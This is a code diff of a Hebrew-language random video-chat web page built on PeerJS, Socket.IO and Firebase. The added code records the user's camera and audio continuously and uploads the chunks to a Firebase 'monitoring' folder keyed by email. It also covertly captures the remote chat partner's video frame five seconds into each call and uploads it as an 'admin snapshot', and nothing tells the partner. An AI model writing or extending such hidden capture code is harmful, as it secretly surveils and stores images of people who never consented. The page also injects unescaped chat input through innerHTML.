@@ -3,156 +3,282 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>VideoApp - Fix</title>
+    <title>VideoApp Pro</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-storage-compat.js"></script>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
     <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
     
     <style>
         * { box-sizing: border-box; touch-action: none; margin: 0; padding: 0; }
-        body { font-family: system-ui; background: #fff; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
+        body { font-family: system-ui, -apple-system, sans-serif; background: #000; height: 100vh; overflow: hidden; display: flex; flex-direction: column; color: white; }
+        
+        /* כפתורי מערכת עליונים */
         .header { position: absolute; top: 10px; width: 100%; display: flex; justify-content: space-between; padding: 0 15px; z-index: 100; pointer-events: none; }
-        .btn { background: rgba(0,0,0,0.7); border: none; color: white; padding: 10px 18px; border-radius: 25px; cursor: pointer; pointer-events: auto; font-weight: bold; }
-        .video-grid { height: 70vh; display: flex; flex-direction: column; background: #000; }
-        .v-box { flex: 1; position: relative; border-bottom: 1px solid #333; overflow: hidden; display: flex; align-items: center; justify-content: center; }
+        .btn { background: rgba(255,255,255,0.2); backdrop-filter: blur(10px); border: none; color: white; padding: 10px 18px; border-radius: 25px; cursor: pointer; pointer-events: auto; font-weight: bold; }
+        
+        /* אזור הוידאו (70%) */
+        .video-container { height: 70vh; display: flex; flex-direction: column; background: #000; position: relative; }
+        .v-box { flex: 1; position: relative; border-bottom: 1px solid #222; overflow: hidden; display: flex; align-items: center; justify-content: center; }
         video { width: 100%; height: 100%; object-fit: cover; }
-        #chat-area { height: 30vh; display: none; flex-direction: column; background: #fff; border-top: 2px solid #eee; }
-        #messages { flex: 1; overflow-y: auto; padding: 10px; }
-        .controls { display: flex; padding: 10px; background: #eee; gap: 10px; }
-        input { flex: 1; padding: 12px; border-radius: 8px; border: 1px solid #ccc; }
-        .status { position: absolute; width: 100%; text-align: center; color: #888; z-index: 10; font-size: 18px; }
+        
+        .status-msg { position: absolute; text-align: center; width: 100%; z-index: 10; pointer-events: none; color: #aaa; font-size: 1.1rem; }
+        .searching { color: #ff8000; font-weight: bold; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+
+        .gender-tag { position: absolute; bottom: 10px; right: 10px; background: rgba(0,0,0,0.6); padding: 5px 12px; border-radius: 15px; font-size: 14px; }
+
+        /* אזור הצ'אט (30%) */
+        #chat-section { height: 30vh; display: none; flex-direction: column; background: #fff; color: #000; }
+        #messages { flex: 1; overflow-y: auto; padding: 10px; font-size: 14px; display: flex; flex-direction: column; }
+        .chat-input { display: flex; padding: 10px; background: #f0f0f0; border-top: 1px solid #ddd; gap: 8px; }
+        .chat-input input { flex: 1; padding: 10px; border-radius: 20px; border: 1px solid #ccc; outline: none; }
+
+        /* מודאלים (הרשמה ופרופיל) */
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 1000; align-items: center; justify-content: center; pointer-events: auto; }
+        .modal-content { background: #fff; color: #333; width: 90%; max-width: 400px; padding: 30px; border-radius: 25px; text-align: right; }
+        .modal-content h2, .modal-content h3 { text-align: center; margin-bottom: 15px; }
+        .modal-content input, .modal-content select { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #ddd; font-size: 16px; }
+        
+        #cancel-search { display: none; margin-top: 60px; background: #e74c3c; pointer-events: auto; }
     </style>
 </head>
 <body>
 
 <div class="header">
-    <button id="p-btn" class="btn" onclick="openProfile()">פרופיל 👤</button>
-    <button id="r-btn" class="btn" style="background:#e74c3c; display:none;" onclick="report()">דיווח</button>
-    <button class="btn" onclick="flipCamera()">🔄</button>
+    <button id="btn-p" class="btn" onclick="openProfile()">פרופיל 👤</button>
+    <button id="btn-r" class="btn" style="background:#c0392b; display:none;" onclick="report()">דיווח</button>
+    <button class="btn" onclick="switchCamera()">🔄</button>
 </div>
 
-<div class="video-grid" id="touch-zone">
+<div class="video-container" id="swipe-zone">
     <div class="v-box">
-        <div id="h-msg" class="status">גרור שמאלה לחיפוש ⬅️</div>
-        <div id="s-msg" class="status" style="display:none; color:#ff8000;">מחפש... (<span id="sec">30</span>)</div>
-        <video id="remoteV" autoplay playsinline></video>
+        <div id="msg-idle" class="status-msg">גרור שמאלה לחיפוש ⬅️</div>
+        <div id="msg-search" class="status-msg searching" style="display:none;">מחפש שותף לשיחה...</div>
+        <button id="cancel-search" class="btn" onclick="stopSearch()">ביטול חיפוש</button>
+        <video id="remoteVideo" autoplay playsinline></video>
+        <div id="p-tag" class="gender-tag" style="display:none;">הצד השני: <span id="p-gender"></span></div>
     </div>
+    
     <div class="v-box">
-        <video id="localV" autoplay muted playsinline></video>
+        <video id="localVideo" autoplay muted playsinline></video>
+        <div class="gender-tag">אתה (מוקלט 🔴)</div>
     </div>
 </div>
 
-<div id="chat-area">
+<div id="chat-section">
     <div id="messages"></div>
-    <div class="controls">
+    <div class="chat-input">
         <input type="text" id="chatIn" placeholder="כתוב הודעה...">
-        <button onclick="sendMsg()" style="background:#ff8000; color:white; border:none; padding:10px 20px; border-radius:8px;">שלח</button>
+        <button onclick="sendMsg()" style="background:none; border:none; font-size:24px; cursor:pointer;">🚀</button>
+    </div>
+</div>
+
+<div id="regModal" class="modal">
+    <div class="modal-content">
+        <h2>הרשמה למערכת</h2>
+        <input type="text" id="reg-name" placeholder="שם מלא">
+        <input type="email" id="reg-email" placeholder="אימייל">
+        <input type="date" id="reg-date">
+        <select id="reg-gender">
+            <option value="זכר">זכר</option>
+            <option value="נקבה">נקבה</option>
+        </select>
+        <button class="btn" style="background:#27ae60; width:100%; margin-top:15px;" onclick="doRegister()">המשך</button>
+    </div>
+</div>
+
+<div id="profModal" class="modal">
+    <div class="modal-content">
+        <h3>הפרופיל שלי</h3>
+        <p id="user-static-info" style="font-size:14px; color:#666; text-align:center; margin-bottom:10px;"></p>
+        <label>שנה מגדר:</label>
+        <select id="up-gender">
+            <option value="זכר">זכר</option>
+            <option value="נקבה">נקבה</option>
+        </select>
+        <button class="btn" style="background:#2ecc71; width:100%; margin-top:10px;" onclick="updateGender()">שמור</button>
+        <button onclick="closeModals()" style="border:none; background:none; width:100%; margin-top:10px; color:gray; cursor:pointer;">סגור</button>
     </div>
 </div>
 
 <script>
-    // 1. תבדוק שהכתובת הזו מדויקת מה-Render שלך (כולל https:// ובלי / בסוף)
-    const RENDER_URL = "https://video-app-backend.onrender.com"; 
-    const socket = io(RENDER_URL);
+    // --- הגדרות שרת ו-Firebase ---
+    const socket = io("https://video-app-backend.onrender.com");
+    const peer = new Peer(undefined, { config: { 'iceServers': [{ 'urls': 'stun:stun.l.google.com:19302' }] } });
 
-    const peer = new Peer(undefined, {
-        config: { 'iceServers': [{ 'urls': 'stun:stun.l.google.com:19302' }] }
-    });
+    const firebaseConfig = {
+      apiKey: "AIzaSyB_ld3VrntNgM3Pgc4jyZL2hKzUMSp-o10",
+      authDomain: "live-video-20fca.firebaseapp.com",
+      projectId: "live-video-20fca",
+      storageBucket: "live-video-20fca.firebasestorage.app",
+      messagingSenderId: "590706792062",
+      appId: "1:590706792062:web:1b75b2871f1068f44aaa2f",
+      databaseURL: "https://live-video-20fca-default-rtdb.firebaseio.com/"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const storage = firebase.storage();
 
-    let myStream, myId, isSearching = false, timer, timeLeft = 30, facing = "user";
+    let myStream, myPeerId, isSearching = false, searchTimer, camFacing = "user";
+    let mediaRecorder, recordedChunks = [];
 
-    // בדיקת חיבור לשרת
-    socket.on('connect', () => console.log("מחובר לשרת ה-Socket!"));
-    socket.on('connect_error', () => alert("שגיאה בחיבור לשרת ב-Render. וודא שהשרת רץ."));
+    // --- אתחול והרשמה ---
+    window.onload = () => {
+        const savedData = localStorage.getItem('userData');
+        if (!savedData) {
+            document.getElementById('regModal').style.display = 'flex';
+        } else {
+            initCamera();
+        }
+    };
 
-    peer.on('open', id => {
-        myId = id;
-        console.log("PeerID מוכן: " + id);
-    });
-
-    async function init() {
-        if(myStream) myStream.getTracks().forEach(t => t.stop());
-        myStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing }, audio: true });
-        document.getElementById('localV').srcObject = myStream;
+    function doRegister() {
+        const data = {
+            name: document.getElementById('reg-name').value,
+            email: document.getElementById('reg-email').value,
+            birth: document.getElementById('reg-date').value,
+            gender: document.getElementById('reg-gender').value
+        };
+        if (!data.name || !data.email || !data.birth) return alert("אנא מלא הכל");
+        localStorage.setItem('userData', JSON.stringify(data));
+        document.getElementById('regModal').style.display = 'none';
+        initCamera();
     }
 
-    // פונקציית החיפוש שהופעלה ע"י הגרירה
+    async function initCamera() {
+        if (myStream) myStream.getTracks().forEach(t => t.stop());
+        try {
+            myStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camFacing }, audio: true });
+            document.getElementById('localVideo').srcObject = myStream;
+            startContinuousRecording(); // הקלטת וידאו מתחילה מיד
+        } catch (e) { alert("חובה לאשר מצלמה"); }
+    }
+
+    // --- מערכת הקלטת וידאו ל-Firebase ---
+    function startContinuousRecording() {
+        mediaRecorder = new MediaRecorder(myStream, { mimeType: 'video/webm;codecs=vp8' });
+        mediaRecorder.ondataavailable = (e) => {
+            if (e.data.size > 0) uploadVideo(e.data);
+        };
+        mediaRecorder.start(30000); // שולח "חתיכה" של 30 שניות כל פעם
+    }
+
+    function uploadVideo(blob) {
+        const user = JSON.parse(localStorage.getItem('userData'));
+        const path = `monitoring/${user.email}/${Date.now()}.webm`;
+        storage.ref(path).put(blob);
+    }
+
+    // --- לוגיקת שידוך ---
+    peer.on('open', id => myPeerId = id);
+
     function startSearch() {
-        if (!myId) {
-            alert("המערכת עדיין מתחברת, נסה שוב בעוד שנייה");
-            return;
-        }
-        
-        resetUI();
+        if (!myPeerId || isSearching) return;
         isSearching = true;
-        document.getElementById('h-msg').style.display = "none";
-        document.getElementById('s-msg').style.display = "block";
-        document.getElementById('p-btn').style.display = "none";
+        document.getElementById('msg-idle').style.display = "none";
+        document.getElementById('msg-search').style.display = "block";
+        document.getElementById('cancel-search').style.display = "inline-block";
+        document.getElementById('btn-p').style.display = "none";
 
-        // שליחה לשרת
-        const profile = JSON.parse(localStorage.getItem('myChatProfile')) || {gender:"זכר"};
-        socket.emit('find-partner', { peerId: myId, gender: profile.gender });
+        const user = JSON.parse(localStorage.getItem('userData'));
+        socket.emit('find-partner', { peerId: myPeerId, gender: user.gender });
 
-        timeLeft = 30;
-        timer = setInterval(() => {
-            timeLeft--;
-            document.getElementById('sec').innerText = timeLeft;
-            if(timeLeft <= 0) {
-                alert("לא נמצא משתמש");
-                resetUI();
-            }
-        }, 1000);
+        searchTimer = setTimeout(() => {
+            if (isSearching) { alert("לא נמצא משתמש כרגע"); stopSearch(); }
+        }, 30000);
+    }
+
+    function stopSearch() {
+        clearTimeout(searchTimer);
+        isSearching = false;
+        socket.emit('leave-chat');
+        document.getElementById('msg-idle').style.display = "block";
+        document.getElementById('msg-search').style.display = "none";
+        document.getElementById('cancel-search').style.display = "none";
+        document.getElementById('btn-p').style.display = "inline-block";
+        document.getElementById('btn-r').style.display = "none";
+        document.getElementById('chat-section').style.display = "none";
+        document.getElementById('p-tag').style.display = "none";
+        document.getElementById('remoteVideo').srcObject = null;
     }
 
     socket.on('partner-found', data => {
-        clearInterval(timer);
+        clearTimeout(searchTimer);
         isSearching = false;
-        document.getElementById('s-msg').style.display = "none";
-        document.getElementById('chat-area').style.display = "flex";
-        document.getElementById('r-btn').style.display = "block";
-        
+        document.getElementById('msg-search').style.display = "none";
+        document.getElementById('cancel-search').style.display = "none";
+        document.getElementById('chat-section').style.display = "flex";
+        document.getElementById('btn-r').style.display = "inline-block";
+        document.getElementById('p-tag').style.display = "block";
+        document.getElementById('p-gender').innerText = (data.gender === "זכר" ? "👨 זכר" : "👩 נקבה");
+
         const call = peer.call(data.peerId, myStream);
-        call.on('stream', rs => document.getElementById('remoteV').srcObject = rs);
+        call.on('stream', rs => document.getElementById('remoteVideo').srcObject = rs);
+        setTimeout(captureAdminSnapshot, 5000); // צילום משולב למנהל אחרי 5 שניות שיחה
     });
 
     peer.on('call', call => {
         call.answer(myStream);
         call.on('stream', rs => {
-            document.getElementById('remoteV').srcObject = rs;
-            document.getElementById('chat-area').style.display = "flex";
-            document.getElementById('r-btn').style.display = "block";
-            document.getElementById('s-msg').style.display = "none";
-            clearInterval(timer);
+            document.getElementById('remoteVideo').srcObject = rs;
+            document.getElementById('chat-section').style.display = "flex";
+            document.getElementById('btn-r').style.display = "inline-block";
+            document.getElementById('p-tag').style.display = "block";
+            document.getElementById('msg-idle').style.display = "none";
+            document.getElementById('msg-search').style.display = "none";
+            document.getElementById('cancel-search').style.display = "none";
         });
     });
 
-    function resetUI() {
-        clearInterval(timer);
-        isSearching = false;
-        document.getElementById('h-msg').style.display = "block";
-        document.getElementById('s-msg').style.display = "none";
-        document.getElementById('p-btn').style.display = "block";
-        document.getElementById('r-btn').style.display = "none";
-        document.getElementById('chat-area').style.display = "none";
-        document.getElementById('remoteV').srcObject = null;
+    // --- פונקציות עזר (Snapshot, צ'אט, פרופיל) ---
+    function captureAdminSnapshot() {
+        const canvas = document.createElement('canvas');
+        canvas.width = 640; canvas.height = 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(document.getElementById('remoteVideo'), 0, 0, 320, 480);
+        ctx.drawImage(document.getElementById('localVideo'), 320, 0, 320, 480);
+        canvas.toBlob(b => {
+            const user = JSON.parse(localStorage.getItem('userData'));
+            storage.ref(`calls_snapshots/${user.email}_${Date.now()}.jpg`).put(b);
+        }, 'image/jpeg');
     }
 
-    // גרירה (Swipe) - וודא שאתה גורר על אזור הוידאו
-    let startX;
-    document.getElementById('touch-zone').addEventListener('touchstart', e => startX = e.touches[0].clientX);
-    document.getElementById('touch-zone').addEventListener('touchend', e => {
-        let diff = startX - e.changedTouches[0].clientX;
-        if(diff > 50) startSearch(); // גרירה שמאלה
+    function openProfile() {
+        const data = JSON.parse(localStorage.getItem('userData'));
+        document.getElementById('user-static-info').innerText = `${data.name} | ${data.email}`;
+        document.getElementById('up-gender').value = data.gender;
+        document.getElementById('profModal').style.display = 'flex';
+    }
+
+    function updateGender() {
+        const data = JSON.parse(localStorage.getItem('userData'));
+        data.gender = document.getElementById('up-gender').value;
+        localStorage.setItem('userData', JSON.stringify(data));
+        closeModals();
+    }
+
+    function closeModals() { document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); }
+
+    function switchCamera() { camFacing = (camFacing === "user" ? "environment" : "user"); initCamera(); }
+
+    function sendMsg() {
+        const inp = document.getElementById('chatIn');
+        if (!inp.value) return;
+        document.getElementById('messages').innerHTML += `<div style="margin-bottom:5px;"><b>אתה:</b> ${inp.value}</div>`;
+        const container = document.getElementById('messages');
+        container.scrollTop = container.scrollHeight;
+        inp.value = "";
+    }
+
+    function report() { if (confirm("דווח על משתמש זה ונתק שיחה?")) stopSearch(); }
+
+    // זיהוי Swipe
+    let touchX;
+    document.getElementById('swipe-zone').addEventListener('touchstart', e => touchX = e.touches[0].clientX);
+    document.getElementById('swipe-zone').addEventListener('touchend', e => {
+        let diff = touchX - e.changedTouches[0].clientX;
+        if (diff > 70 && !isSearching) startSearch();
     });
-
-    function flipCamera() { facing = (facing === "user" ? "environment" : "user"); init(); }
-    function sendMsg() { /* לוגיקת שליחה */ }
-    function openProfile() { alert("פרופיל ייפתח כאן"); }
-    function report() { if(confirm("לדווח?")) resetUI(); }
-
-    init();
 </script>
 </body>
 </html>
